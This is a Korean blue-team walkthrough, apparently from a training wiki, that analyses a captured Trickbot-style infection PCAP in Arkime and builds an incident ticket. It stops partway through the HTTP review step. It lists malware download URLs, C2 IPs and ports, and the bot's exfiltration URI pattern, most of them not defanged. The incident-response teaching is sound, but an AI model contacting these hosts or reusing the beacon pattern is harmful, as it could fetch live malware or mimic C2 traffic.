---
title: Arkime만으로 분석하기 — 스크립트 다운로더에서 비밀번호 탈취, TLS C2, 침해사고 티켓까지
tags:
  - blue-team
  - pcap
  - arkime
  - cyberchef
  - trickbot
  - c2
  - credential-theft
  - ticket
---

# Arkime만으로 분석하기 — 스크립트 다운로더에서 비밀번호 탈취, TLS C2, 침해사고 티켓까지 { #arkime-only-walkthrough }

!!! abstract "사례 요약"
    `mondogreek.com` 도메인의 윈도우 10 PC 한 대가 브라우저가 아닌 **스크립트로** `YAS20.exe`를 받았습니다. 12분 안에 공인 IP를 확인하고, **449·447 포트**로 암호화된 C2를 열고, 모듈을 더 받고, **훔친 브라우저 비밀번호와 정찰 정보를 평문 HTTP POST로 보냈고**, 같은 망을 **SMB 445**로 훑었습니다(거절됨). 패턴은 **Trickbot**과 일치합니다(추정, 오프라인이라 해시 조회 불가). 전 과정을 **Arkime 웹 화면만으로** 풀었고, 디코딩에만 CyberChef를 썼으며, 마지막에 침해사고 티켓을 완성합니다.

| | |
|---|---|
| **증거** | PCAP 1개, 2020-03-11 21:22:35 – 22:06:41 UTC (44분 06초), 세션 1,131개 |
| **환경** | 폐쇄망, 인터넷 없음(VirusTotal, OSINT 불가). Arkime v5.6.4 웹 화면 + CyberChef(오프라인) |
| **결과물** | 침해사고 티켓: 인덱스, 설명, 영향받은/외부 장비, 검색 쿼리, 증거 위치, 작업 로그와 짝이 맞는 도구 출력 |
| **관련 페이지** | [Arkime로 PCAP 분석하기](../../network/arkime/offline-pcap-guide.md) · [Arkime 검색 문법](../../network/arkime/search-syntax.md) · [비콘과 C2](../../network/beaconing-c2.md) · [EternalBlue / SMBv1](../../adversary/eternalblue-smbv1.md) |

!!! tip "이 페이지 읽는 법"
    초보자가 처음부터 따라 할 수 있게 썼습니다. 단계마다 같은 순서로 설명합니다.

    1. **목적** — 이 단계에서 무엇을 알아내려는지
    2. **쿼리** — 코드 블록 오른쪽의 **복사 버튼**으로 복사
    3. **쿼리 해설** — 한 조각씩 무슨 뜻인지
    4. **실제 결과** — 화면에 어떻게 나오는지
    5. **결과 읽기** — 그 결과가 무엇을 뜻하고 왜 수상한지(또는 정상인지)
    6. **티켓 기록** — 이 단계를 티켓의 작업 로그와 노트에 어떻게 남기는지

    **질문** 상자는 분석하면서 실제로 나온 질문과 그 답입니다. 맨 끝의 [복사용 쿼리 모음](#query-sheet)에는 다음 PCAP에 바로 쓸 수 있게 `<자리표시>`로 바꾼 쿼리를 모았습니다.

## 한눈에 보는 답 { #answers }

| 항목 | 답 | 상태 |
|---|---|---|
| 감염 PC | **10.3.11.194 LAPTOP-7XMV2SN**, 사용자 **otis.witherspoon**, MAC `b8:ca:3a:ec:3b:8f`, Windows 10 Pro 빌드 18363 | 확인됨 |
| 첫 악성 이벤트 | **21:24:36 UTC** — `bolton-tech[.]com`(50.87.248.17)에서 `GET /YAS20.exe`, 요청 주체 `WinHttp.WinHttpRequest.5` | 확인됨 |
| 네트워크 | 10.3.11.0/24, 게이트웨이 10.3.11.1, DC/DNS/DHCP **10.3.11.3 Mondogreek-DC**, 도메인 `mondogreek.com` | 확인됨 |
| C2 | TLS **190.214.13.2:449**(상시 연결), **185.14.31.98:447**(다운로드, 자체 서명 `example.com` 인증서), 185.180.198.50:447(응답 없음), HTTP POST **203.176.135.102:8082** | 확인됨 |
| 유출 | 21:36:52–21:38:49 평문 POST 5개: 브라우저 비밀번호(IE, Firefox), 프로세스 목록, systeminfo, ipconfig·net·nltest 결과 | 확인됨 |
| 측면 이동 | 21:36:47, 21:37:17에 10.3.11.119, .218, .1, .131, .254로 SMBv1 전용 탐색 — **모두 거절** | 확인됨(시도 실패) |
| 범위 | 다른 내부 PC는 외부 IOC와 통신하지 않음 | 확인됨 |
| 악성코드 계열 | Trickbot 유형(URI `/yas20/<호스트>_W10018363.<봇ID>/81/`, 447/449 포트, `example.com`/"Global Security" 인증서, 모듈 방식 탈취) | 추정 |

---

## 0단계 — Arkime가 데이터를 보여주는 방식 { #step-0 }

### 세션이란 { #sessions }

Arkime는 패킷을 한 개씩 보여주지 않고 **세션(session)** 단위로 묶어서 보여줍니다. 세션은 **"A가 B와 나눈 대화 하나"**라고 생각하면 됩니다. 예를 들어 `10.3.11.194:51234 → 8.8.8.8:53`이 세션 하나입니다.

세션마다 이런 정보가 붙어 있습니다.

- 시작 시간(Start Time)과 끝 시간(Stop Time)
- 패킷 수, 바이트 수
- 프로토콜(tcp, udp, http, tls, dns …)
- 분석된 경우 HTTP라면 호스트·URI·User-Agent, TLS라면 인증서, DNS라면 질의한 이름

!!! note "Moloch = Arkime"
    팀 티켓 양식에 `MOLOCH:`라는 칸이 있다면, 거기가 바로 Arkime 쿼리를 적는 곳입니다. Arkime의 옛날 이름이 Moloch였습니다.

### 쓰게 될 화면 { #tabs }

| 탭 | 용도 |
|---|---|
| **Sessions** | 검색 결과 세션 목록. 줄 왼쪽의 `+`를 누르면 세션 상세와 패킷 내용이 열림 |
| **SPI View** | "각 필드에 어떤 값이 몇 번 나왔는지" 세어서 보여줌. Splunk의 `stats count by 필드`와 같은 역할 |
| **Connections** | 누가 누구와 통신하는지 그래프 |
| **Files** | Arkime가 읽어 들인 PCAP 파일 목록 |
| **Settings** | 시간대 설정 (**UTC**로 바꿀 것) |

Sessions 화면 맨 위에는 **검색창**, 그 아래에 **시간 범위**(Start / End), **Bounding**, 그리고 **시간대별 막대그래프**가 있습니다.

### 함정 1 — 시간 범위 { #time-range }

!!! warning "기본값이 Last hour(최근 1시간)"
    시간 범위 드롭다운의 기본값은 보통 **Last hour**입니다. PCAP이 며칠 전 것이면 화면에 **아무것도 안 나옵니다.** "데이터가 없네?" 하고 당황하는 경우가 대부분 이것 때문입니다.

    - 조사할 기간을 알면 **Start / End에 날짜를 직접** 넣습니다.
    - 모르면 일단 **All**로 바꿔서 데이터가 언제부터 언제까지 있는지 확인합니다.
    - 검색창은 비워 두고 **Search**를 누릅니다.

그러면 위쪽에 **시간대별 막대그래프**가 나옵니다. 여기서 볼 것은 두 가지입니다.

- 데이터가 처음 시작하는 시점과 끝나는 시점
- 갑자기 막대가 솟는 구간 — 트래픽이 몰린 때, 나중에 다시 볼 후보

그래프 위의 **Session / Packets / Bytes** 버튼으로 기준을 바꿀 수 있습니다. **Bytes로 바꿨을 때 솟는 구간**은 큰 파일 전송이 있었다는 뜻일 수 있어서, 나중에 유출(exfil)을 찾을 때 단서가 됩니다.

### 함정 2 — 시간대 { #timezone }

!!! warning "브라우저 시간대로 표시됨"
    Arkime는 기본으로 **브라우저(내 PC)의 현지 시간**으로 표시합니다. 그런데 티켓은 보통 **UTC**로 씁니다. 예를 들어 내 PC가 UTC+10:30이면, 이걸 놓치면 모든 시간이 **10시간 30분씩 어긋납니다.**

    오른쪽 위 사용자 메뉴 → **Settings → General → Timezone Format → UTC**. 바꾸고 나면 그래프 축의 시간 뒤에 `UTC`가 붙습니다(예: `2020/03/11 21:25:00 UTC`). 이걸로 설정이 맞는지 확인할 수 있습니다.

---

## 1단계 — 데이터 시작·끝 시간과 세션 수 { #data-range }

**목적:** 분석할 데이터가 언제부터 언제까지인지, 얼마나 많은지 파악합니다. 티켓의 모든 시간은 이 범위 안에 있어야 합니다.

!!! question "질문: 세션 단위라고 했는데, 데이터의 시작 시간과 끝 시간은 어떻게 보나요?"
    세션마다 **Start Time**(첫 패킷 시간)과 **Stop Time**(마지막 패킷 시간)이 있습니다. 그래서 데이터 전체의 시작과 끝은 이렇게 정합니다.

    - **데이터 시작** = 모든 세션 중 **가장 빠른 Start Time**
    - **데이터 끝** = 모든 세션 중 **가장 늦은 Stop Time**

    **방법 1: 세션 목록 정렬 (가장 정확)**

    1. Sessions 탭, 시간 범위 **All**, 검색창 비우고 **Search**
    2. 목록 위의 **Start Time** 열 제목을 클릭합니다. 한 번 누르면 오름차순(오래된 것부터), 다시 누르면 내림차순이에요. 제목 옆 작은 화살표로 방향을 확인합니다.
    3. 오름차순일 때 **첫 줄의 Start Time = 데이터 시작**
    4. 이번에는 **Stop Time**을 클릭해 **내림차순**(최신부터)으로 → **첫 줄의 Stop Time = 데이터 끝**

    끝 시간을 Start Time 내림차순으로 보지 않는 이유: 일찍 시작해서 오래 이어진 세션(긴 다운로드나 C2 연결)은 Start Time이 이르더라도 **Stop Time이 가장 늦을 수 있습니다.** 그래서 끝은 Stop Time으로 봅니다.

    **방법 2: 타임라인 그래프 (대략)**

    시간 범위를 All로 두면 막대그래프의 **가장 왼쪽 막대와 가장 오른쪽 막대**가 데이터가 있는 구간입니다. 마우스를 막대 위에 올리면 그 시간대가 나옵니다. 빠르게 감 잡기에는 좋지만 초 단위까지 정확하지는 않으니, 티켓에는 방법 1의 값을 씁니다.

    **방법 3: Files 탭 (참고용)**

    상단 메뉴 **Files** 탭의 **First Date** 열이 각 PCAP 파일의 첫 패킷 시간입니다. 파일이 여러 개면 어떤 파일이 어느 시점부터인지 볼 수 있습니다. 끝 시간은 나오지 않습니다.

**전체 세션 수**는 세션 목록 위에 이렇게 나옵니다.

```text
Showing 1 - 50 of 1,131 entries
```

**실제 결과:**

```text
Start  2020/03/11 21:22:35 UTC
End    2020/03/11 22:06:41 UTC
Duration 00:44:06   (shown at the right of the time bar)
Sessions 1,131
```

시간 막대 오른쪽의 `00:44:06`이 데이터 길이입니다. 시간 막대의 **Bounding: First Packet**은 "세션의 첫 패킷 시간이 범위 안에 있는 세션을 보여준다"는 뜻입니다.

**티켓 기록:**

```text
[251117 2000, Analyst] Establishing data time range and session count - Found

[251117 2000, Analyst] Data range 2020-03-11 21:22:35 - 22:06:41 UTC (44:06). 1,131 total sessions. Display timezone set to UTC.
```

---

## 2단계 — 전체 그림: 프로토콜과 내부 PC { #step-1 }

**목적:** 이 네트워크에서 주로 무슨 통신이 오가는지, 누가 내부이고 누가 외부인지 정합니다. 이걸 **기준선(baseline)**이라고 합니다. 나중에 "평소와 다른 것"을 찾을 때 비교 대상이 됩니다.

**쿼리:** 검색창을 비우고 Search → **SPI View** 탭 → **General** 섹션.

**실제 결과:**

```text
Protocols  tcp (672)  udp (458)  tls (349)  dns (325)  http2 (126)  ldap (79)  krb5 (78)
           http (44)  dcerpc (41)  smb (30)  llmnr (29)  ssdp (16)  ntp (9)  mdns (8)  quic (6)  igmp (1)
Src IP     10.3.11.119 (491)  10.3.11.194 (377)  10.3.11.218 (259)  10.3.11.3 (3)  52.242.211.89 (1)
```

괄호 안 숫자는 그 값이 나온 **세션 수**입니다.

### 프로토콜 읽기 { #protocols }

| 프로토콜 | 뜻 | 판단 |
|---|---|---|
| `ldap` (79), `krb5` (78), `dcerpc` (41), `smb` (30), `dns` (325) | 윈도우 PC가 도메인에 로그인하고 정책을 받을 때 나오는 통신 | **Active Directory 환경.** 정상. 단, 나중에 **워크스테이션끼리** SMB/DCERPC가 오가면 측면 이동(lateral movement)을 의심 |
| `llmnr`, `ssdp`, `mdns`, `igmp` | 윈도우가 이웃 장치를 찾을 때 내는 신호 | 평소 잡음. 지금은 무시 |
| `tls` (349), `http2` (126), `quic` (6) | 암호화된 웹 통신 | 내용은 못 봄. 인증서·목적지·크기로 판단 |
| `http` (44) | **평문** 웹 통신 | URL, 파일 이름, User-Agent가 다 보임. **악성 행위를 찾기 가장 좋은 곳** |

여기서 **예상 밖의 것**이 있는지 메모합니다. 예를 들어 워크스테이션 망인데 `ssh`, `irc`, `rdp`가 보이면 기록해 둡니다. 이번 데이터에는 없었습니다.

### 내부와 외부 정하기 { #internal-external }

티켓에는 **INTERNAL IP와 EXTERNAL IP를 나눠** 적어야 하므로, 이건 분석 처음에 꼭 정합니다. 사설 대역이 내부, 나머지가 외부입니다.

| 사설 대역 | 범위 | CIDR 표기 |
|---|---|---|
| 10.x.x.x | 10.0.0.0 – 10.255.255.255 | `10.0.0.0/8` |
| 172.16–31.x.x | 172.16.0.0 – 172.31.255.255 | `172.16.0.0/12` |
| 192.168.x.x | 192.168.0.0 – 192.168.255.255 | `192.168.0.0/16` |

내부 PC가 시작한 세션만 보려면:

```text
ip.src == 10.0.0.0/8
```

| 조각 | 뜻 |
|---|---|
| `ip.src` | 출발지 IP 필드. (`ip`만 쓰면 출발지·목적지 둘 다, `ip.dst`는 목적지만) |
| `==` | "같다"는 비교 연산자 |
| `10.0.0.0/8` | CIDR 표기. 10.0.0.0 ~ 10.255.255.255 전체. Arkime는 IP 필드에 CIDR을 그대로 받아 줍니다 |

결과는 세션 목록이고, 각 줄은 `Start Time | Stop Time | Src IP / Port | Dst IP / Port | Packets | Databytes / Bytes | Info` 형식입니다.

**결과 읽기:**

- **내부망은 `10.3.11.0/24`.** 세션을 시작한 쪽은 거의 다 `10.3.11.x`입니다.
- **10.3.11.119, .194, .218**이 대부분의 트래픽을 만듭니다 → 사용자가 쓰는 **워크스테이션**일 가능성이 높습니다.
- **10.3.11.3은 출발지로 3번뿐.** 서버는 보통 요청을 **받는** 쪽이라 Src IP로는 적게 나옵니다 → **서버, 아마 도메인 컨트롤러(DC)** 로 추측. [3단계](#dc)에서 확인합니다.
- **52.242.211.89 (1)**: 외부 IP가 **출발지**로 한 번 나옵니다. 보통은 내부가 외부로 접속하니 눈에 띕니다. 원인은 대부분 둘 중 하나입니다.
    - 캡처가 시작되기 **전부터 이미 연결되어 있던** 세션이라 Arkime가 처음 본 패킷이 서버 쪽 응답이었음 (흔함, 대개 무해)
    - 실제로 외부에서 안으로 들어온 연결 (주의 필요)

    [5단계](#step-3)에서 확인합니다.

**티켓 기록:**

```text
[251117 2003, Analyst] Reviewing protocol distribution and internal hosts - Found

[251117 2003, Analyst] SPI View (no filter). Internal network 10.3.11.0/24.
Src IP: 10.3.11.119 (491), 10.3.11.194 (377), 10.3.11.218 (259), 10.3.11.3 (3), 52.242.211.89 (1)
Protocols: tcp 672, udp 458, tls 349, dns 325, http2 126, ldap 79, krb5 78, http 44, dcerpc 41, smb 30, llmnr 29, ssdp 16, ntp 9, mdns 8, quic 6, igmp 1
Active Directory environment (ldap/krb5/dcerpc/smb). 3 workstations + 1 server.
```

---

## 3단계 — DC 확인 { #dc }

**목적:** 10.3.11.3이 정말 도메인 컨트롤러인지 확인합니다.

**쿼리:**

```text
ip.dst == 10.3.11.3
```

| 조각 | 뜻 |
|---|---|
| `ip.dst` | 목적지 IP 필드 |
| `== 10.3.11.3` | "10.3.11.3으로 **들어간** 세션만 보여줘" |

**실제 결과 (SPI View → General):**

```text
Dst IP     10.3.11.3 (571)
Protocols  udp (371)  dns (325)  tcp (200)  ldap (79)  krb5 (78)  dcerpc (41)  smb (24)  ntp (9)
Src IP     10.3.11.119 (251)  10.3.11.194 (170)  10.3.11.218 (150)
```

**결과 읽기:**

- 들어오는 571개가 **dns, ldap, krb5, dcerpc, smb, ntp**뿐입니다. DNS(이름 조회) + Kerberos(로그인) + LDAP(디렉터리) + RPC + SMB(정책 파일) + NTP(시간 동기화)가 한 서버로 모이면 전형적인 **DC 겸 DNS 서버**입니다.
- 전체 krb5 78개가 전부 이 서버로 갑니다.
- 그래프 축에 `21:25:00 UTC`처럼 나오면 **시간대도 UTC로 잘 설정**된 것입니다.

!!! tip "포트로도 확인하기"
    General 섹션에서 **Dst Port** 필드 버튼을 누르면 포트 값이 나옵니다. `53 (DNS)`, `88 (Kerberos)`, `389 (LDAP)`, `135 (RPC)`, `445 (SMB)`가 보이면 DC가 맞습니다.

**티켓 기록:**

```text
[251117 2010, Analyst] Identifying host roles (DC) - Found

[251117 2010, Analyst] Query: ip.dst == 10.3.11.3 -> 571 sessions. Protocols: udp 371, dns 325, tcp 200, ldap 79, krb5 78, dcerpc 41, smb 24, ntp 9. Src: 10.3.11.119 (251), 10.3.11.194 (170), 10.3.11.218 (150).
10.3.11.3 = Domain Controller / DNS (all krb5/ldap terminate here).
```

---

## 4단계 — Kerberos로 호스트이름과 사용자 찾기 { #step-2 }

**목적:** 티켓에는 **IP + 호스트이름**을 같이 적어야 합니다. Kerberos 통신에는 컴퓨터 계정 이름과 사용자 계정 이름이 모두 들어 있습니다.

**쿼리:**

```text
ip.src == 10.3.11.0/24 && protocols == krb5
```

| 조각 | 뜻 |
|---|---|
| `ip.src == 10.3.11.0/24` | 출발지가 내부망 PC 아무거나 |
| `&&` | AND(그리고). 앞 조건과 뒤 조건을 **둘 다** 만족해야 함 |
| `protocols == krb5` | 프로토콜이 Kerberos인 세션 |

검색한 다음 **SPI View**에서 아래쪽의 **krb5** 섹션을 찾아 펼칩니다.

!!! question "질문: krb5 섹션에 정보가 cname, cname Cnt, Realm 같은 이름밖에 안 나와요. 어떻게 해야 하나요?"
    SPI View는 속도 때문에 **필드 이름만 먼저 보여주고, 값은 사용자가 요청할 때** 불러옵니다. 지금 보이는 `cname`, `Realm`, `sname` 같은 것들은 값이 아니라 **필드 버튼**이에요. 1단계에서 Dst IP, Protocols, Src IP 값이 바로 보였던 건 이 세 개가 기본으로 켜져 있기 때문입니다.

    값을 보려면 둘 중 하나를 합니다.

    - **`cname` 버튼(이름 부분)을 클릭** → cname 값만 불러옵니다.
    - 오른쪽의 **Load All** 클릭 → krb5 섹션의 필드를 전부 불러옵니다. 처음엔 이게 편합니다.

    필드 뜻:

    | 필드 | 뜻 |
    |---|---|
    | **cname** | 인증을 요청한 계정. 끝에 `$`가 붙으면 **컴퓨터(호스트이름)**, 없으면 **사용자** |
    | **Realm** | 도메인 이름 |
    | **sname** | 접속하려는 서비스. `krbtgt/도메인` = 로그인 티켓, `cifs/서버` = 파일 공유, `ldap/서버` = 디렉터리 조회, `host/PC` = 그 PC 자체 |
    | **cname Cnt** 등 `Cnt` | "세션 하나에 값이 몇 개 있었나"라는 숫자. 지금은 무시 |

**실제 결과 (Load All 후):**

```text
cname   laptop-i9zpi04$ (8)  otis.witherspoon (6)  laptop-7xmv2sn$ (4)  laptop-sqsa42o$ (4)
        LAPTOP-7XMV2SN$ (2)  LAPTOP-I9ZPI04$ (2)  LAPTOP-SQSA42O$  dominga.mcdowell (2)  dorian.neff (2)
Realm   MONDOGREEK.COM (62)  MONDOGREEK (8)  mondogreek.com (8)
sname   krbtgt/MONDOGREEK.COM (26)  cifs/Mondogreek-DC.mondogreek.com (9)  krbtgt/MONDOGREEK (8)
        krbtgt/mondogreek.com (8)  ldap/Mondogreek-DC.mondogreek.com (6)  LDAP/Mondogreek-DC.mondogreek.com (5)
        cifs/MONDOGREEK.COM (3)  cifs/Mondogreek-DC (3)  host/laptop-7xmv2sn.mondogreek.com (2) …
```

**결과 읽기:**

- **도메인은 `MONDOGREEK.COM`** (Realm)
- sname의 `cifs/Mondogreek-DC.mondogreek.com`과 `ldap/Mondogreek-DC…`를 보면 **DC 이름은 `Mondogreek-DC`**
- 컴퓨터 계정(`$`): laptop-i9zpi04, laptop-7xmv2sn, laptop-sqsa42o (대소문자는 상관없음)
- 사용자 계정: otis.witherspoon, dominga.mcdowell, dorian.neff

### 이름과 IP 짝 맞추기 { #pairing }

cname 값 하나(예: `laptop-7xmv2sn$`)를 **클릭**하면 작은 메뉴가 뜹니다. **and**를 고르면 검색창에 조건이 붙습니다.

```text
ip.src == 10.3.11.0/24 && protocols == krb5 && krb5.cname == "laptop-7xmv2sn$"
```

| 조각 | 뜻 |
|---|---|
| `krb5.cname` | Kerberos의 cname 필드 |
| `== "…"` | 이 값과 같은 것만. 값에 `$` 같은 특수문자가 있을 수 있어서 따옴표로 감쌈 |

다시 Search → General 섹션의 **Src IP**를 보면 그 이름이 어느 IP에서 나왔는지 나옵니다. 이름마다 반복합니다. 반대로 IP를 하나씩 넣어도 됩니다.

```text
ip.src == 10.3.11.194 && protocols == krb5
```

**최종 표:**

| IP | 역할 | 호스트이름 | 사용자 |
|---|---|---|---|
| 10.3.11.3 | 도메인 컨트롤러 / DNS | Mondogreek-DC | — |
| 10.3.11.119 | 워크스테이션 | LAPTOP-SQSA42O | dorian.neff |
| 10.3.11.194 | 워크스테이션 | LAPTOP-7XMV2SN | otis.witherspoon |
| 10.3.11.218 | 워크스테이션 | LAPTOP-I9ZPI04 | dominga.mcdowell |

이제 티켓에 IP와 호스트이름을 같이 적을 수 있습니다.

**티켓 기록:**

```text
[251117 2015, Analyst] Mapping internal IPs to hostnames/users via Kerberos cname - Found

[251117 2015, Analyst] Query: ip.src == 10.3.11.0/24 && protocols == krb5 -> SPI View krb5 (cname/realm/sname).
Realm: MONDOGREEK.COM. DC: Mondogreek-DC.mondogreek.com (sname cifs/ldap)
10.3.11.3   Mondogreek-DC
10.3.11.119 LAPTOP-SQSA42O  user dorian.neff
10.3.11.194 LAPTOP-7XMV2SN  user otis.witherspoon
10.3.11.218 LAPTOP-I9ZPI04  user dominga.mcdowell
```

---

## 5단계 — 외부 "출발지" 52.242.211.89 확인 { #step-3 }

**목적:** 외부 IP가 세션을 시작한 것처럼 보이는 이유를 확인합니다. 진짜 인바운드 공격인지, 단순한 착시인지.

**쿼리:**

```text
ip.src == 52.242.211.89
```

**실제 결과:** 세션 1개. 줄 왼쪽 `+`를 눌러 상세를 엽니다.

```text
Time        2020/03/11 21:32:00 UTC - 21:32:00 UTC
Src IP/Port 52.242.211.89 : 443 { ARIN }
Dst IP/Port 10.3.11.194 : 50355
Src         Packets 1  Bytes 229  Databytes 0
Dst         Packets 1  Bytes 54   Databytes 0
Src Ethernet  20:e5:2a:b6:93:f1  OUI Netgear
Dst Ethernet  b8:ca:3a:ec:3b:8f  OUI Dell Inc.
TCP Flags   SYN 0  SYN-ACK 0  ACK 0  PSH 1  RST 1  FIN 0  URG 0
```

**결과 읽기 (세션 상세 읽는 연습):**

**① TCP Flags: `SYN 0 SYN-ACK 0 PSH 1 RST 1`**
정상적인 TCP 연결은 항상 **SYN → SYN-ACK → ACK**(3-way handshake)로 시작합니다.

```text
client → server  SYN        "연결해도 될까?"
server → client  SYN-ACK    "좋아"
client → server  ACK        "그럼 시작할게"
```

여기는 SYN이 0입니다. 즉 **연결이 시작되는 장면을 Arkime가 보지 못했다**는 뜻입니다. 이 연결은 원래 노트북이 먼저 만든 건데, 그 시작 부분이 캡처에 없습니다.

**② 포트: `52.242.211.89:443 → 10.3.11.194:50355`**
443은 HTTPS **서버** 포트이고, 50355는 클라이언트가 잠깐 쓰는 임시 포트(ephemeral port, 보통 49152 이상)입니다. 실제로는 **노트북(클라이언트)이 서버에 접속한 연결**이고, Arkime가 처음 본 패킷이 서버가 보낸 것이라서 서버를 Src로 표시했을 뿐입니다.

**③ 패킷 흐름: 서버 PSH 1개 → 노트북 RST 1개**
PSH는 "데이터를 바로 넘겨라", RST는 "이 연결 끊어(모르는 연결이야)"입니다. 서버가 데이터를 보냈는데 노트북은 이미 그 연결을 닫은 상태라서 RST로 답한 겁니다. 흔히 보이는 정리 동작입니다.

**④ 페이로드: 깨진 글자**
TLS로 암호화된 데이터라서 읽을 수 없는 게 정상입니다.

**⑤ MAC 주소 팁**
Src MAC이 **Netgear**(공유기/게이트웨이), Dst MAC이 **Dell**(노트북)입니다. 외부 IP에서 오는 패킷은 항상 게이트웨이를 거쳐서 들어오기 때문에 **외부 IP의 MAC은 게이트웨이 MAC**으로 보입니다. 외부 IP 옆에 내부 장비 MAC이 보인다면 오히려 이상한 것입니다.

**결론:** `{ ARIN }`은 미국 등록 대역(Microsoft Azure 쪽)입니다. 외부에서 들어온 공격이 아니라 **끝나 가던 HTTPS 연결의 마지막 조각**입니다. 무해합니다. 이렇게 **의심했다가 배제한 것**도 티켓에 남기는 게 중요합니다. 다른 분석가가 같은 걸 다시 확인하지 않아도 되니까요.

**티켓 기록:**

```text
[251117 2020, Analyst] Checking external IP 52.242.211.89 seen as session initiator (possible inbound) - Not Found

[251117 2020, Analyst] Query: ip.src == 52.242.211.89 -> 1 session.
200311 21:32:00 UTC 52.242.211.89:443 {ARIN} -> 10.3.11.194:50355 tcp, 2 packets, 283 bytes. TCP flags SYN 0 SYN-ACK 0 PSH 1 RST 1. Src MAC 20:e5:2a:b6:93:f1 (Netgear, gateway), Dst MAC b8:ca:3a:ec:3b:8f (Dell). Payload encrypted TLS record.
No handshake captured; mid-session server packet on 443 answered by client RST. Not an inbound connection. Benign.
```

---

## 6단계 — 평문 HTTP 44개 훑기 { #step-4 }

**목적:** 본격적으로 수상한 것을 찾습니다. HTTP는 암호화가 안 되어 있어서 **어디에 접속해서 무엇을 받았는지**가 다 보입니다.

**쿼리:**

```text
ip.src == 10.3.11.0/24 && protocols == http
```

| 조각 | 뜻 |
|---|---|
| `ip.src == 10.3.11.0/24` | 내부 PC가 시작한 연결만 |
| `&&` | 그리고 |
| `protocols == http` | 평문 HTTP만 |

검색 → **SPI View** → **http** 섹션 → **Load All**.

### 중요한 필드 { #http-fields }

| 필드 | 뜻 | 왜 보나 |
|---|---|---|
| **Hostname** (`host.http`) | 접속한 도메인 | 어디에 갔나 |
| **URI** | 요청한 경로와 파일 | 무엇을 받았나 (예: `/files/update.exe`) |
| **Request Method** | `GET`(받기), `POST`(보내기) | 외부로 가는 POST가 많으면 유출이나 C2 의심 |
| **Status Code** | `200`(성공), `404`(없음) … | 실제로 받았는지 |
| **Useragent** | 요청을 보낸 프로그램 | 브라우저가 아닌 이상한 값이면 의심 |
| **Body Magic** | 받은 파일의 **실제 종류** | `application/x-dosexec` = 윈도우 실행 파일(.exe/.dll). 파일 이름을 `.jpg`로 위장해도 이 값은 속일 수 없음 |
| **Body MD5** | 받은 본문의 MD5 해시 | 나중에 IOC로 사용 |

### 먼저 정상 잡음 걸러내기 { #noise }

윈도우는 평소에도 HTTP로 이런 곳에 자주 접속합니다. 이런 건 넘어가도 됩니다.

```text
www.msftconnecttest.com   /connecttest.txt    (internet connectivity check)
ctldl.windowsupdate.com   /msdownload/...     (certificate trust list update)
ocsp.digicert.com         /MFEw...            (certificate revocation check)
crl.securetrust.com       /STCA.crl           (certificate revocation list)
```

이번 데이터에서 걸러낸 정상 잡음:

- `ctldl.windowsupdate.com`, `ocsp.digicert.com`, `crl.securetrust.com` — User-Agent도 `Microsoft-CryptoAPI/10.0`(4)으로 윈도우 정상 동작
- `fonts.googleapis.com`, `fonts.gstatic.com`, `ajax.googleapis.com` — 웹 폰트와 jQuery
- `wsimg.com`, `nebula.wsimg.com`, `img.secureserver.net` — GoDaddy 웹사이트 이미지와 스크립트
- `notable-quotes.com`, `newegg.com`, `tuscaloosabarnyard.com` — 사용자가 브라우저로 본 사이트(User-Agent가 진짜 Edge/Chrome)

이렇게 정상을 먼저 지우면 남는 게 잘 보입니다.

### 의심 후보 4가지 { #http-candidates }

**① `bolton-tech.com/YAS20.exe` — 실행 파일 다운로드**

URI 끝이 `.exe`입니다. 그리고 **Body Magic에 `application/x-dosexec`(2)**가 있고, 서버 응답 content-type에도 `application/x-msdownload`(1)가 있습니다. 실제로 **윈도우 실행 파일이 HTTP로 내려왔다**는 증거입니다. 평문 HTTP로 이름 모를 사이트에서 exe를 받는 건 매우 수상합니다.

**② `64.44.133.131/images/cursor.png`(2), `/images/imgpaper.png`(1) — 도메인 없이 IP로 접속**

도메인 이름 없이 **IP 주소로 직접** HTTP 접속을 했습니다("naked IP"). 정상 웹사이트는 거의 항상 도메인을 씁니다. 그리고 이름은 `.png`인데, `x-dosexec`가 2개였죠. 하나가 YAS20.exe라면 **나머지 하나는 이 "png" 중 하나일 수 있습니다.** 즉 **그림인 척하는 실행 파일**일 가능성이 있습니다. [9단계](#step-6)에서 확인합니다.

**③ `203.176.135.102:8082/yas20/LAPTOP-7XMV2SN_W10018363.CF3A…/81/` — 가장 결정적**

이 URI를 조각내서 보면:

```text
203.176.135.102:8082   → raw IP + non-standard port 8082
/yas20/                → campaign / group tag (same name as YAS20.exe!)
LAPTOP-7XMV2SN         → hostname of 10.3.11.194 (found in step 4)
W10018363              → Windows 10 build 18363
CF3A0EAB425F...CAED6   → unique ID per infected PC (bot ID)
/81/ , /90/            → command / data-type number
```

**감염된 PC가 자기 이름을 URL에 넣어서 공격자 서버에 보고하는 모양**입니다. 그리고 숫자를 맞춰 보면 `/81/` 4개 + `/90/` 1개 = **5개**인데, **POST가 정확히 5개**이고 `multipart/form-data`(파일·데이터 업로드 형식)도 **5개**입니다. 경계값(boundary)도 `---------ATBOXLGQOOBDZTLA`처럼 무작위 대문자입니다. 그러니까 이 5번의 POST는 **PC에서 공격자 서버로 데이터를 올려 보낸 것**, 즉 **C2 통신 또는 정보 유출** 후보입니다. (이 짝짓기는 아직 **추론**입니다. [10단계](#step-7)에서 확인합니다.)

`yas20` 태그와 `/호스트명_W10빌드.봇ID/명령번호/` 형식은 **Trickbot 악성코드의 C2 패턴과 매우 비슷**합니다. 다만 아직은 가설입니다.

**④ `checkip.amazonaws.com` — 내 공인 IP 확인**

사람은 이 주소를 거의 직접 열지 않습니다. 악성코드가 감염 직후 **"내가 어느 나라, 어느 회사 네트워크에 있지?"**를 확인할 때 자주 씁니다.

### 이상한 User-Agent { #user-agents }

```text
KSKJJGJ (1)                                                     ← meaningless letters, very odd
WinHTTP loader/1.0 (1)                                          ← a program, not a browser
Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5) (1)   ← value used by scripts (VBS/JS/PowerShell)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; ...) (4)    ← IE 7 on Windows 10? impossible. 4 = the 4 x /81/
```

**티켓 기록:**

```text
[251117 2030, Analyst] Reviewing cleartext HTTP for executable downloads, raw-IP hosts, POST requests and unusual user agents - Found

[251117 2030, Analyst] Query: ip.src == 10.3.11.0/24 && protocols == http -> 44 sessions. SPI View http:
Body Magic: application/x-dosexec (2), application/octet-stream (2). Response content-type application/x-msdownload (1).
Request Method: GET 39, POST 5. Request content-type multipart/form-data (5, random boundaries).
